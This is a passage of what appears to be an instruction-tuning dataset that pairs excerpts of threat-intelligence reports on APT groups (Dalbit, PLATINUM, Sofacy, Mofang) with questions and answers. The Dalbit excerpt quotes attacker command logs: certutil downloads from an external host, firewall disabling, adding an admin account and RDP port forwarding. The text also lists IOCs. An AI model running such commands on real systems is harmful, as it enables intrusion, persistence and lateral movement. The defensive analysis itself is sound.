    "output": "Modification of off-the-shelf malware like Gh0st RAT affects its attribution and tracking by making it somewhat traceable. When criminals modify the code, the malware becomes attributable and can be linked to specific cases and criminal groups. This is because the modifications introduce unique characteristics that can be analyzed and connected to previous incidents. Cybercriminals might choose to modify such malware despite the potential risks because it allows them to customize the functionality to better suit their specific needs and evade detection by traditional security measures. Additionally, modifications can make the malware more effective in achieving the goals of their campaigns, whether those goals are financial gain, espionage, or other malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.2. Infiltration Process\n3.2.1. Initial Infiltration\nIt is assumed that their attack targets are usually servers with a specific Korean groupware installed on them, email servers (Exchange Server), and SQL servers. The threat actor exploited either file upload vulnerabilities or WebLogic vulnerabilities such as CVE-2017-10271 to upload their WebShell. A portion appeared to have used a SQL server command prompt (xp_cmdshell).\nThe most frequently used WebShells are Godzilla, ASPXSpy, AntSword, and China Chopper in that order. Aside from these, several other WebShells were also found.\nThe installation paths of the WebShells are as follows.\n\u2013 Job recruitment (File upload vulnerability)\nD:\\WEB\\********recruit\\css\\1.ashx\nD:\\WEB\\********recruit\\css\\4.ashx\nD:\\WEB\\********recruit\\common\\conf.aspx\n...\n\u2013 File upload vulnerability D:\\UploadData\\***********\\****_File\\Data\\Award\\1.ashx D:\\UploadData\\***********\\****_File\\Data\\Award\\2.aspx D:\\UploadData\\***********\\****_File\\Data\\Award\\3.aspx D:\\**WebService\\********\\*****Editor\\sample\\photo_uploader\\File\\conf.aspx D:\\**WebService\\********_ThesisSubmission\\Include\\file.aspx\n...\n\u2013 Certain groupware\nD:\\Web\\(Groupware)\\cop\\1.ashx\nD:\\Web\\(Groupware)\\app\\4.ashx\nD:\\Web\\(Groupware)\\bbs\\4.asmx\nD:\\Web\\(Groupware)\\erp\\tunnel.aspx (ReGeorg)\nD:\\inetpub\\(Groupware)\\image\\2.asmx\nD:\\inetpub\\(Groupware)\\image\\2.aspx C:\\(Groupware)\\Web\\(Groupware)\\cop\\conf.aspx\nC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.ashx\nC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.asmx\nC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.aspx\n\u2026 \u2013 Email server (Exchange Server)\nD:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\aa.aspx\nD:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\11.aspx\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET\nFiles\\root\\91080f08\\2694eff0\\app_web_defaultwsdlhelpgenerator.aspx.cdcab7d2.sjx_41yb.dll\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\91080f08\\2694eff0\\app_web_ldaj2kwn.dll\n\u2026\n\u2013 WeblogicD:\\***\\wls1035\\domains\\************\\servers\\*******\\tmp\\************\\uddiexplorer\\gcx62x\\war\\modifyregistryhelp.jsp D:\\***\\wls1035\\domains\\************\\servers\\*******\\tmp\\************\\wls-wsat\\zfa3iv\\war\\eee.jsp D:\\***\\wls1035\\domains\\************\\servers\\*******\\tmp\\************\\wls-wsat\\zfa3iv\\war\\error.jsp D:\\Oracle\\**********\\user_projects\\domains\\*************\\servers\\WLS_FORMS\\tmp\\************\\wls-wsat\\tcsxmg\\war\\123.jsp D:\\Oracle\\**********\\user_projects\\domains\\*************\\servers\\WLS_FORMS\\tmp\\************\\wls-wsat\\tcsxmg\\war\\test.jsp D:\\Oracle\\**********\\user_projects\\domains\\*************\\servers\\WLS_FORMS\\tmp\\************\\wls-wsat\\tcsxmg\\war\\aaa.jsp\n\u2026\n\u2013Tomcat\nC:\\(Tomcat)\\webapps\\dd\\sb.jsp\nC:\\(Tomcat)\\webapps\\ddd\\index.jsp\nC:\\(Tomcat)\\webapps\\docs\\update.jsp\nC:\\(Tomcat)\\webapps\\tmp\\shell.jsp\nTable 4. Paths where WebShells were uploaded\n3.2.2. Download\nThe threat actor downloads other hacking tools through default Windows programs. Since WebShells are normally used in infiltration, parent processes, excluding command processes like cmd, are run by web server processes such as w3wp.exe, java.exe, sqlserver.exe, and tomcat*.exe. The downloaded files include privilege escalation tools, proxy tools, and network scanning tools, all of which are required by the threat actor. The download command is as follows.\n(Additionally, the full addresses of the Korean companies that have been exploited will not be disclosed.)\n1) Certutil\n> certutil -urlcache -split -f hxxp://www.ive***.co[.]kr/uploadfile/ufaceimage/1/update.zip c:\\programdata\\update.exe (frpc)\n> certutil -urlcache -split -f hxxp://121.167.***[.]***/temp/8.txt c:\\programdata\\8.ini (frpc.ini)\n> certutil -urlcache -split -f (<https://asec.ahnlab.com/en/47455/8080/frpc.exe>)hxxp://103.118.42[.]208:8080/frpc.exe frpc.exe\n\u2026\nTable 5. Certutil download log\n2) Bitsadmin\n> bitsadmin /transfer mydownloadjob /download /priority normal \"\"\n\"c:\\windows\\debug\\winh32.exe\" (frpc)\n> bitsadmin /transfer mydownloadjob /download /priority normal \"\"\n\"c:\\windows\\debug\\log.ini\" (frpc.ini)\n\u2026\nTable 6. Bitsadmin download log\nThe hacking tools and malware downloaded by the threat actor were usually found in the following paths.\n%ALLUSERSPROFILE%\n%SystemDrive%\\temp\n%SystemDrive%\\perflogs\n%SystemDrive%\\nia\n%SystemDrive%\\.tmp\n%SystemRoot%\n%SystemRoot%\\debug\n%SystemRoot%\\temp\nTable 7. Major directories used by the Dalbit group\nTherefore, the files in these paths should be checked if users suspect that they have been infiltrated.\n3.2.3. Privilege Escalation and Account Addition\nThe threat actor mainly used Potato (BadPotato, JuicyPotato, SweetPotato, RottenPotato, EFSPotato) and PoC (CVE-2018-8639, CVE-2019-1458), which has been published on GitHub, for privilege escalation. After privilege escalation, they characteristically add the following account.\nThe below sp.exe is the SweetPotato tool.\n> sp.exe \"whaomi\" (Privilege check)\n> sp.exe \"netsh advfirewall set allprofiles state off\" (Firewall OFF)\n> sp.exe \"net user main ff0.123456 /add & net localgroup administrators main /add\" (Add account)\nTable 8. SweetPotato usage log\nThe point of focus here is the name of the account added by the threat actor. Threat actor accounts with the name \"main\" have been found in other infiltrated company servers.\nAside from adding accounts, the threat actor would also use stolen admin accounts.\n> wmic /node:127.0.0.1 /user:storadmin /password:r*****1234!@#$ process call create \"cmd.exe /c c:\\temp\\s.bat\"\nTable 9. Admin account execution log\n3.2.4. Proxy Settings\nAfter infiltrating a server, the threat actor initiates access via proxy to use RDP communications. FRP and LCX were the mainly used proxy tools, and there have been cases where (<https://github.com/sensepost/reGeorg>)ReGeorg, , or  was found in some companies. Additionally, multiple proxy tools including FRP and LCX were found in one area of a certain company that was infiltrated. Multiple FRP configuration files (.ini) would also be discovered in cases where internal propagation had occurred. We believe that the threat actor installs additional FRPs and uses multiple configuration files when an accessible PC has a lot to gain. Furthermore, the LCX used by this group has the same features as the open-source LCX, but its version is not the same as the one uploaded to GitHub, meaning that a binary that was arbitrarily compiled by a Chinese person was used.\nProxy tools like FRP and LCX differ in terms of forwarding methods and supported protocols. However, since their differences, actual infection (<https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=33148c82-f99c-443d-998e-068cf972eeb9>)cases, recreation, and network packets have all been covered in the TI report, \"Analysis Report on Attack Cases Exploiting Various Remote Control Tools,\" they will not be reiterated in this post.\n1) FRP(FAST REVERSE PROXY)\nFRP configuration files (.ini) were found in all servers and PC devices infiltrated by this group. The following is an actual case of an infiltrated company.\nIn particular, the Dalbit group usually used the Socks5 protocol to communicate. The Socks5 protocol is a layer 5 protocol in the 7 OSI layers. It can handle various requests such as HTTP, FTP, and RDP since it is between layer 4 and 7. Therefore, if the threat actor uses a proxy connection tool that can handle Socks5, such as Proxifier, remote control through RDP becomes possible. If a connection can be established to an internal PC, lateral movement can also be achieved. Thus, if the configuration file is set as a Socks5 protocol, the threat actor will have more freedom as additional modifications will no longer be required to handle various requests.\nThe following are FRP filenames and commands used by the threat actor. The list is in a descending order from most to least used.\nFRP filenames\ndebug.exe main.exe\nupdate.exe\ninfo.exe\nAgent.exe frpc.exe test.exe zabbix.exe winh32.exe cmd.exe\nTable 10. FRP filenames\nFRP commands\n> update.exe -c frpc.ini\n> update.exe -c 8080.ini\n> update.exe -c 8.ini\n> info.zip -c frpc__8083.ini\n> debug.exe -c debug.ini\n> debug.exe -c debug.log\n> debug.exe -c debug.txt\n> frpc.exe -c frpc__2381.ini\n> cmd.exe /c c:\\temp\\****\\temp\\frpc.ini\n\u2026\nTable 11. FRP execution log\nIn certain companies, the FRP was registered to the task scheduler (schtasks) under the name \"debug\" to maintain its persistence. As shown in Table 12, the team confirmed the execution of a registered scheduler.\n> schtasks /tn debug /run\nTable 12. Task scheduler execution log\n2) LCX(HTRAN)\nDalbit used an LCX (Htran) binary compiled by a certain Chinese person. This has the same features as the (<https://github.com/HiwinCN/HTran>)existing binary, but it also includes the nickname of the binary creator.\nWe can confirm through this that the nickname of the person who had created the binary is \"\u6298\u7fbd\u9e3f\u9e44\" (QQ:56345566). It is highly unlikely that this developer is the threat actor in question; however, since this binary cannot be downloaded through a simple search online, it is assumed that the threat actor has a connection to China.\nThe installed filenames and executables are as follows:\nLCX filenames\nlcx3.exe lcx.exe update.exe\nTable 13. LCX filenames\nLCX commands\n> update.exe -slave 1.246.***.*** 110 127.0.0.1 3389\n> lcx3.exe -slave 222.239.***.*** 53 127.0.0.1 3389\n\u2026\nTable 14. LCX command log\nThe above LCX C2 is a Korean company server and has been concealed.\n3.2.5. Internal Reconnaissance\nFscan and NBTScan have been commonly used for network scans, but the usage of TCP Scan and Goon have also been confirmed for some cases.\nis a network scanning tool made with Golang that not only allows basic port scanning, but scanning for Tomcat, MSSQL, and MYSQL accounts as well. We can see that this tool was also made in Chinese.\n3.2.6. Information Extortion\n\nAnswer this question based on the above context: What methods does the Dalbit group employ to download additional hacking tools once they have gained initial access, and where are these tools typically stored?",
    "output": "The Dalbit group employs default Windows programs like Certutil and Bitsadmin to download additional hacking tools. These tools include privilege escalation tools, proxy tools, and network scanning tools. The downloaded files are usually found in directories such as %ALLUSERSPROFILE%, %SystemDrive%\\\\temp, %SystemDrive%\\\\perflogs, %SystemDrive%\\\\nia, %SystemDrive%\\\\.tmp, %SystemRoot%, %SystemRoot%\\\\debug, and %SystemRoot%\\\\temp.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 1. Executive Summary\nThe Global Research and Analysis Team (GReAT) at Kaspersky Lab has discovered new malware attacks in Syria, with malicious entities using a plethora of methods from their toolbox to hide and operate malware. In addition to proficient social engineering tricks, victims are often tempted to open and explore malicious files because of the dire need for privacy and security tools in the region. In the hopes of maintaining anonymity and installing the latest \"protection\", victims fall prey to these malicious creations. A vast majority of the samples obtained were found on activist sites and in social networking forums.\nThe victims are distributed across different countries:\n\u2022 Syria\n\u2022 Lebanon\n\u2022 Turkey\n\u2022 Kingdom of Saudi Arabia\n\u2022 Egypt\n\u2022 Jordan\n\u2022 Palestine\n\u2022 United Arab Emirates\n\u2022 Israel\n\u2022 Morocco\n\u2022 United States\nThe group members are operating from different locations around the world:\n\u2022 Syria\n\u2022 Russian Federation\n\u2022 Lebanon\nThe group's attacks are evolving and they are making extensive use of social engineering techniques to trick targeted victims into running their malicious files. Among the principal file extensions observed among the malware samples obtained we can list:\n\u2022 .exe\n\u2022 .dll\n\u2022 .pif\n\u2022 .scr\nThe group is relying on RAT (Remote Access Tool) Trojan tools, of which the most common are:\n\u2022 ShadowTech RAT\n\u2022 Xtreme RAT\n\u2022 NjRAT\n\u2022 Bitcomet RAT\n\u2022 Dark Comet RAT\n\u2022 Blackshades RAT\nThe number of malicious files found is 110, with a big increase seen in recent attacks.\nThe number of domains linked to the attacks is 20.\nThe number of IP addresses linked to the attacks is 47.\nThe samples details and domains lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document.\nProtection and resilience against these attacks is ensured through the use of a multi-layered security approach, having up to date security products, and mainly by being sceptical about suspicious files.\nAnswer this question: How does the Syrian malware campaign leverage social engineering techniques to distribute malware, and what types of files are commonly used in these attacks? Additionally, how can cybersecurity experts enhance protection against these types of attacks?",
    "output": "The Syrian malware campaign leverages social engineering techniques by exploiting the dire need for privacy and security tools in the region. Victims are often tempted to open and explore malicious files under the guise of maintaining anonymity and installing the latest 'protection'. These malicious files are commonly distributed through activist sites and social networking forums. The principal file extensions observed among the malware samples include .exe, .dll, .pif, and .scr. To enhance protection against these types of attacks, cybersecurity experts should adopt a multi-layered security approach, ensure that security products are up to date, and foster a culture of skepticism towards suspicious files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: AhnLab Cyber Threat Intelligence Report\nAnalysis Report of\nKimsuky Group's APT Attacks\n(AppleSeed, PebbleDash)\nAhnLab Security Emergency response Center (ASEC)\nNovember 16th, 2021\nGuide on Document Classification\nPublications or provided content can only be used within the scope allowed for each classification as shown below.\nRemarks\nIf the report includes statistics and indices, some data may be rounded, meaning that the sum of each item may not match the total.\nThis report is protected by copyright law and as such, reprinting and reproducing it without permission is prohibited in all cases.\nSeek permission from AhnLab in advance\nif you wish to use a part or all of the report.\nIf you reprint or reproduce the material without the permission of the organization mentioned above, you may be held accountable for criminal or civil liability.\nThe version information of this report is as follows:\nAnswer this question: How does the Kimsuky Group's APT attack strategy, involving AppleSeed and PebbleDash, highlight the importance of comprehensive threat intelligence and incident response in cybersecurity?",
    "output": "The Kimsuky Group's APT attacks, specifically through the use of AppleSeed and PebbleDash, underscore the critical need for robust threat intelligence and incident response capabilities in cybersecurity. These attacks demonstrate the sophistication and complexity of modern cyber threats, which often involve multiple stages and advanced techniques. By leveraging comprehensive threat intelligence, organizations can better understand the tactics, techniques, and procedures (TTPs) employed by groups like Kimsuky. This understanding enables proactive defense measures, such as identifying potential vulnerabilities and implementing countermeasures before an attack occurs. Additionally, effective incident response strategies ensure that organizations can quickly detect, contain, and mitigate the impact of successful intrusions, minimizing damage and preventing further compromise.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "PLATINUM continues to evolve, find ways to maintain invisibility\nmsft-mmpc\nJune 7,\n2017\nBack in April 2016, we released the paper (<http://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf>)PLATINUM: Targeted attacks in South and Southeast Asia , where we detailed the tactics, techniques, and procedures of the PLATINUM activity group.\nWe described a group that was well-resourced and quickly adopted advanced techniques, such as (<https://blogs.technet.microsoft.com/mmpc/2016/04/26/digging-deep-for-platinum/>)hot patching to silently inject code into processes. They used hot patching even when traditional injection techniques could have been sufficient and less costly to develop.\nSince the 2016 publication, Microsoft has come across an evolution of PLATINUM's file-transfer tool, one that uses the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel for communication. This channel works independently of the operating system (OS), rendering any communication over it invisible to firewall and network monitoring applications running on the host device. Until this incident, no malware had been discovered misusing the AMT SOL feature for communication.\nUpon discovery of this unique file-transfer tool, Microsoft shared information with Intel, and the two companies collaborated to analyze and better understand the purpose and implementation of the tool. We confirmed that the tool did not expose vulnerabilities in the management technology itself, but rather misused AMT SOL within target networks that have already been compromised to keep communication stealthy and evade security applications.\nThe updated tool has only been seen in a handful of victim computers within organizational networks in Southeast Asia\u2014PLATINUM is known to customize tools based on the network architecture of targeted organizations. The diagram below represents the file-transfer tool's updated channel and network flow.\nThe AMT SOL feature is not enabled by default and requires administrator privileges to provision for usage on workstations. It is currently unknown if PLATINUM was able to provision workstations to use the feature or piggyback on a previously enabled workstation management feature. In either case, PLATINUM would need to have gained administrative privileges on targeted systems prior to the feature's misuse.\n\nWhy might PLATINUM have chosen to use hot patching for code injection instead of traditional injection techniques, and how does this reflect their capabilities and resources?",
    "output": "PLATINUM chose to use hot patching for code injection despite the availability of traditional injection techniques because they are a well-resourced group that quickly adopts advanced techniques. Hot patching allows them to silently inject code into processes, which is more sophisticated and less likely to be detected compared to traditional methods. This reflects their advanced capabilities and resources, as developing and implementing hot patching techniques is more complex and costly. Their choice indicates a strategic focus on maintaining invisibility and evading detection, even at the expense of additional development effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "New Version of OSX.SabPub & Confirmed Mac APT attacks\nLate last week, (<https://www.securelist.com/en/blog/208193467/SabPub_Mac_OS_X_Backdoor_Java_Exploits_Targeted_Attacks_and_Possible_APT_link>)we found evidence of a possible link between a Mac OS X backdoor trojan and an APT attack known as (<http://t.co/BYJ1lnBX>)LuckyCat. The IP address of the C&C to which this bot connects (199.192.152.*) was also used in other Windows malware samples during 2011, which made us believe we were looking at the same entity behind these attacks.\nFor the past two days, we have been monitoring a \"fake\" infected system - which is a typical procedure we do for APT bots. We were extremely surprised when during the weekend, the APT controllers took over our \"goat\" infected machine and started exploring it.\nOn Friday Apri 13, port 80 on the C&C server located at rt*****.onedumb.com and hosted on a VPS in Fremont, U.S. was closed. Saturday, the port was opened and bot started communicating with the C&C server. For the entire day, the traffic was just basic handshakes and exchanges, nothing more.\nOn the morning of Sunday April 15, the traffic generated by the C&C changed. The attackers took over the connection and started analysing our fake victim machine. They listed the contents of the root and home folders and even stole some of the goat documents we put in there!\nRead the text above and answer this question: In the context of the OSX.SabPub APT attack, how did the researchers determine a possible link between the Mac OS X backdoor trojan and the LuckyCat APT attack? Additionally, explain the significance of the C&C server's behavior over the weekend and what it reveals about the attackers' methodology.",
    "output": "The researchers determined a possible link between the Mac OS X backdoor trojan and the LuckyCat APT attack based on the shared IP address of the Command and Control (C&C) server. Specifically, the IP address 199.192.152.* was used by both the Mac OS X backdoor and other Windows malware samples during 2011, suggesting that the same entity might be behind these attacks. Over the weekend, the researchers monitored a 'fake' infected system, which is a common procedure for analyzing APT bots. On Friday, April 13, port 80 on the C&C server was closed, but it reopened on Saturday, allowing the bot to start communicating with the C&C server. On Sunday, April 15, the attackers took over the connection and began analyzing the fake victim machine, listing the contents of the root and home folders and stealing some of the goat documents placed there. This behavior indicates that the attackers were actively engaged and manually interacting with the compromised system, demonstrating their hands-on approach and interest in gathering specific data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: DOMAIN: CBIUAEBN.COM\n\u2022 Created: 2015-04-29\n\u2022 Updated: 2015-05-03\n\u2022 Nameserver: ok2host.com\nCorrelating the increasing amounts of information, root9B analysts have determined that the adversary responsible for the initial attack in June 2014 was almost certainly the same, or very closely-related to the entity responsible for creating at least two of the domains in April 2015. The same person was ostensibly responsible for registering the two most recent domains (CBIUAEBN.COM and CBIUAEBANK. COM). Analysts from root9B now believe that the adversary most likely selected this name through an internet search, and that these personas, while possibly real names, are not the true names of those individuals associated with the preparations for this attack.\nroot9B analysts have also identified an additional persona; one that did not appear to directly relate to this attack against CBI UAE Bank, but that carried similar operational tactics to include comparable street address schemes and the registration of\ndomains closely resembling financial institutions. By studying the new persona, root9B discovered they had previously created several domains and websites, all of which have been flagged as Fake Financial Institutions by security analysts. Also identified during this analysis, was the prepositioning of a domain targeting the financial institution B-OFAMERIC.COM, created in April 2015.  This indicates that Bank of America, is among the probable targets.\nThis same individual has registered numerous other fake domains on many more name servers. One of these name servers, BULKBREAKERS.COM, contains several other international financial institutions.  One of those domains, T-D-CANADATRUST.COM, was updated on 23 March 2015, and appears to be targeting Toronto Dominion (TD) Canada Trust. Among the apparent targets of other domains similarly created or updated in 2015 are: the United Nations, United Nations Children's Fund, United Bank for Africa, Regions Bank, and possibly Commerzbank.\nBig Headline: Results\nWhile root9B's discovery began with servicing their own customers, their analysis has revealed an adversary pattern that has enabled the identification of previously unknown target vectors. As root9B analysts continued to peel back the layers, it became more apparent, that this attack was likely associated with Russian intelligence. The targets included multiple major financial institutions, as well as the international government domain. In addition to identifying targets, root9B analysts also discovered indicators of malware, the analysis of which revealed several zero-day threats and their corresponding \"hashes.\" Each new discovery revealed more information, enabling a more complete picture to emerge. root9B discovered and analyzed numerous other domains being staged or recently created for the malicious cyber operation. Also  discovered was a fatal flaw in the hackers tradecraft that lead to a major breakthrough. Research based on the adversary's flaw in tactics showed that there was a strong likelihood of two distinct subgroups, each of which utilized unique\nmethods of cover for their activity. Each of the two groups also had a unique theme to their target sets. The first seemed to focus on military, diplomatic, and media targets, and relied on the cover of proxies and private domain registrations. As documented earlier, the other group used deliberately falsified personalities, all of which claimed to be American citizens, and focused on financial and banking targets. Understanding the scope of the newly staged malicious operations, root9B also tipped the information to the appropriate international and domestic government authorities.\nWhile the continued vector of the attack remains unclear, root9B assesses that it will most likely be a spear-phishing campaign. This attack vector will likely use a well-crafted email containing either a malicious file or web hyperlink to what recipients believe is the actual website; but is instead a fake landing page. In typical attacks of this nature, once users navigate to the link, visitors are prompted to supply account credentials and personal information under the false assumption that they are communicating with their bank via a secure link. However, it is possible, that the Sofacy group could utilize this server as a vector to deliver malicious code to the banking victims in an attempt to obtain access to the network. As of October 2014, the Symantec Corporation had reported an increased use of spear-phishing emails containing malware specifically targeted against financial institutions.\nAccording to their conclusions, root9B analysts expect that spear-phishing attacks will begin in the near future, or may have already commenced.  As root9B continues to work with authorities it is recommended that the aforementioned financial institutions take caution examining any and all correspondence. In addition, it is recommended that networks begin blocking the following hashes and communications with the identified Command and Control (C2) server:\nMalware SHA1 Hash\n0450aaf8ed309ca6baf303837701b5b23aac6f05 bb909d9c27a509bf97cdc85268556ff5a6d2550a f325970fd24bb088f1befdae5788152329e26bf3 a351842ee01374d66bae35354ffe72f0b1b8a40b\nCommand and Control (C2) Server: 176.31.112.10\nInteresting samples of over 250 identified malicious domains*:\nb-of-americ.com osce-military.org bbcnewsweek.com qov.hu.com settings-yahoo.com yovtube.co googlesetting.com cbiuaebn.com cbiuaebank.com techcruncln.com un-unicef.org royalbsuk.com kwqx.us middle-eastreview.org unitednat.org fbonlinelottery.com fubnt.com globeshippers.biz globeshippers.net gsandsc.com gshippers.com hesselawchambers.com largefarm.net regionsbnk.info seatreasures.org ssandsc.com t-d-canadatrust.com techielawfirms.com togounoffice.com ubagroupsgh.com un-unicef.org unicomba.com universalcoba.com\n*Some domains may have been previously reported as associated with the Sofacy Group. It is root9B's opinion that new information regarding cybercrime targeting banks makes this information relevant.\nAnswer this question: How did root9B's analysis of the adversary's tactics reveal a broader pattern of targeting, and what were the key findings regarding the adversary's methods and potential attack vectors? How did root9B respond to these findings, and what recommendations did they provide to mitigate the threat?",
    "output": "Root9B's analysis of the adversary's tactics revealed a broader pattern of targeting that included multiple major financial institutions as well as international government domains. They discovered indicators of malware, revealing several zero-day threats and their corresponding 'hashes.' The analysis also uncovered a fatal flaw in the hackers' tradecraft, indicating two distinct subgroups using unique methods of cover for their activity. One group focused on military, diplomatic, and media targets, relying on proxies and private domain registrations, while the other used deliberately falsified personalities claiming to be American citizens and focused on financial and banking targets. Root9B tipped off the appropriate international and domestic government authorities about the newly staged malicious operations. They assessed that the attack vector would likely be a spear-phishing campaign using well-crafted emails containing malicious files or web hyperlinks leading to fake landing pages. To mitigate the threat, root9B recommended that financial institutions examine all correspondence carefully and block the following hashes and communications with the identified Command and Control (C2) server: Malware SHA1 Hash: 0450aaf8ed309ca6baf303837701b5b23aac6f05, bb909d9c27a509bf97cdc85268556ff5a6d2550a, f325970fd24bb088f1befdae5788152329e26bf3, a351842ee01374d66bae35354ffe72f0b1b8a40b; Command and Control (C2) Server: 176.31.112.10.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: a \u030cng, to imitate) is a threat actor that almost certainlyf M\u00f3 ,\u6a21\u4eff (Mofang operates out of China and is probably government-affiliated.\nIt is highly likely that Mofang's targets are selected based on involvement with investments, or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is most clearly the case in a campaign focusing on government and critical infrastructure of Myanmar that is described in this report. Chances are about even, though, that Mofang is a relevant threat actor to any organization that invests in Myanmar or is otherwise politically involved.\nIn addition to the campaign in Myanmar, Mofang has been observed to attack targets across multiple sectors (government, military, critical infrastructure and the automotive and weapon industries) in multiple countries. The following countries have, in the above named sectors, been affected, although fox-it suspects there to be more: India, Germany, United States, Canada, Singapore, South Korea.\nDespite its diverse set of targets Mofang is probably one group. This is based on the fact that its tools (ShimRat and ShimRatReporter) are not widely used, and that campaigns are not usually observed in parallel.\nTechnically, the group uses distinct tools that date back to at least February 2012: ShimRat and ShimRatReporter. The mofang group does not use exploits to infect targets, they rely on social engineering and their attacks are carried out in three stages:\n1 Compromise for reconnaissance, aiming to extract key information about the target infrastructure.\n2 Faux infrastructure setup, designed to avoid attracting attention.\n3 The main compromise, to carry out actions on the objective.\nThe name ShimRat is based on how its persistence is build up. It uses the so-called shims in Windows to become persistent. Shims are simply hot patching processes on the fly, to ensure backward compatibility of software on the Microsoft Windows platform.\nAs far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. The only exploits the group uses are privilege elevation exploits built into their own malware. The vulnerabilities that were being exploited were already known about at the time of use.\nThe full report contains contextual as well as technical information about the group and its activities. These can be used, for example, for threat assessments, compromise assessments, incident response and forensics activities.\nShould you have any additional information or questions about this group or its activities, please get in touch with fox-it through info@fox-it.com.\nMedium Headline: 2.1 About the Mofang group\nDespite its diverse set of targets (described in paragraph 2.2), Mofang is probably one group. This is based on the fact that its tools (ShimRat and ShimRatReporter) are not widely used, and that campaigns are not usually observed in parallel.\nBased on a numbers of factors that will be explained in more detail in this Chapter, it is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated.\nThe most compelling evidence that supports this hypothesis is the fact that the targets and campaigns known so far can be persuasively correlated to important geopolitical events and investment opportunities that align with Chinese interests. The most notable of these will be described in chapter 5, which describes systematic espionage in the government and critical infrastructure sector of Myanmar. It describes:\n\u2022 Companies that are involved with investment possibilities that also involve Chinese state owned organizations, become targets;\n\u2022 Government agencies or companies that play a role in deciding about Chinese investments, become targets;\nIn addition to the above, there are four notable technical facts. Details such as these can, of course, be changed and manipulated without material impact to attacks, which makes them weaker indicators of attribution than contextual evidence derived from likely campaign goals. In this case, the technical facts support the hypothesis for attribution.\nBased on a numbers of factors that will be explained in more detail in this Chapter, it is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated.\n1 There are many similarities at the code level between the stager used by Mofang and others stagers attributed to Chinese groups. Also striking is the method of hijacking Antivirus Products to run the malware, which fox-it calls ShimRat, as described in chapter chapter 7.1. This has been seen in multiple espionage campaigns attributed to Chinese groups. In fact the similarities are so strong that some investigators have mistaken ShimRat to be another widely known piece of malware: PlugX. Based on in-depth investigation of both, fox-it has come to the conclusion that they are not the same. ShimRat is probably t is used by a separate group.\n2 All the documents that were used for the initial attacks contain meta-data that suggests they were created with WPS Office. This product, also known as Kingsoft Office, is a Chinese product comparable to Microsoft Office. Artifacts can be seen in document metadata as shown in Figure 1.\n3 Simplified Chinese is set as the character set in many of the resources inside various malware samples, as shown in Figure 2.\n4 An earlier version of ShimRat's C2 communication protocol used two very specific words as keywords for requests and responses: Yuok and Yerr. Although the meaning is not directly obvious, it may be an approximate phonetic representation of the Cantonese \u90c1 \u4f62, beat him or kill him. If this is true, it would suggest at least passive knowledge of Cantonese on the part of the malware author. The use of Yuok and Yerr was discontinued and replaced by ataD or Data in 2013, as shown in the side by side comparison in Figure 4. The current communication protocol is documented in paragraph 7.1.6.\n1 Special economic zones, of which Myanmar currently has three, are specific areas within a country where certain laws and regulations are different from the rest of the country, usually with the aim of furthering the 'host' country's economy.\nMedium Headline: 2.2 Mofang's targets: a diverse set of entities\nOn analysis of the organizations that were attacked by Mofang in the past, at first glance it appears that there is no particular sector or country that it targets. Figure 5 shows aggregate information about known attacks from the past four years.\nLooking at the attacks, it is highly likely that targets are selected based on involvement with investments, or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is most clearly the case in the campaign focusing on Myanmar. In it, a company was attacked that was involved in a special economic zone1 in Myanmar, which would be of specific interest to China's National Petroleum Corporation's investments. It is highly likely that they were targeted because of this, as new waves of attacks can be correlated with events surrounding the investments in that area.\nBig Headline: 3 The distinct modus operandi of Mofang\nThe Mofang group uses distinct malware that dates back to at least February 2012. The two tools used in their campaigns are:\n1 ShimRat\n2 ShimRatReporter\nAs far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. The only exploits the group uses are privilege elevation exploits built into their own malware. The vulnerabilities that were being exploited were already known about at the time of use. A more detailed description of the malware can be found in paragraph 7.1 and 7.2.\nThe Mofang group has a distinct method of carrying out attacks using these two tools, with the goal of stealing information. In short, their method, which is described below, can be summarized as follows:\n1 Initial reconnoitering compromise: an initial compromise is performed on specific employees of a targeted organization with the aim of extracting key information about the target infrastructure to be used in stage 2;\n2 Faux infrastructure setup: the group sets up (external) infrastructure designed to avoid attracting attention;\n3 The main compromise.\nMedium Headline: 3.1 Stage 1: Initial reconnoitering compromise\nFor the initial compromise, an 'environment mapping tool' known as ShimRatReporter, is delivered to suitable targets. ShimRatReporter can extract a wealth of information about an infrastructure, but the most pertinent data needed for the next stage in their attack are:\n\u2022 Local privileges for the infected user;\n\u2022 Local domain;\n\u2022 Local proxy setup;\n\u2022 Installed software.\nShimRatReporter is fully explained in chapter 7.2.\nThe delivery method of ShimRatReporter is most likely through emails pointing to an executable placed on a compromised (and trusted) website.\nfox-it has observed targeted and untargeted variations of the initial stage of the attack:\n1 Untargeted: the ShimRatReporter sends out the report with the information and immediately downloads the ShimRat malware from a hardcoded location. This variation is probably less targeted, with victims added to the global campaign C2 for check-in and control. For more information about the global campaign, see paragraph 6.4.\n2 Targeted: the ShimRatReporter 